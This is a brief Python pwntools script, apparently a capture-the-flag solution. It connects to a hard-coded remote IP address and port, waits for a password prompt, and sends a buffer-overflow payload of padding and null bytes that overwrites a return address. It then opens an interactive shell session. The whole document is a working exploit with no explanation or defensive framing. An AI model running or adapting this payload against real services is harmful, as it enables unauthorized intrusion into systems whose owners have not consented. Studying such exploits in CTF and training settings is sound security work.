from pwn import *


io = remote("45.76.91.112", 10052)

io.recvuntil(b"Enter password:")

io.send(b"aaaaabbb\x00bbcccccdddddeeeeefffffg\x00\x00\x00\x00\x00\x00\x00\x00\x35\x13\x40\x00\x00\x00\x00\x00")
io.sendline(b"")

io.interactive()
